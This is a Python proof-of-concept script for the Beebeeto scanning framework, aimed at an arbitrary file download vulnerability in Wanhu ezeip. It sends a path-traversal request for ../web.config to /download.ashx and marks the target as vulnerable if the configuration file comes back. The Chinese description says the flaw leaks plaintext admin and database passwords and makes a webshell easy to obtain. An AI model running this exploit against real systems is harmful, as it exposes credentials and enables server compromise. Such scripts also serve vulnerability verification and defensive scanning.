#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0129',
            'name': '万户ezeip /download.ashx 任意文件下载漏洞 POC',
            'author': 'warsong',
            'create_date': '2015-08-17',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ezeip',
            'vul_version': ['*'],
            'type': 'Arbitrary File Download',
            'tag': ['万户漏洞', '/download.ashx漏洞', 'aspx'],
            'desc': '''
                    万户ezeip任意文件下载漏，可以获取管理员账号，密码明文、数据库密码明文、
                    配置信息等非常敏感的信息，可以轻松实现无任何限制获取 WEBSHELL ...
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-057764'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        verify_url = ('%s/download.ashx?files=../web.config') % url
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and '<?xml version=' in req.content:
            if 'configuration' in req.content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())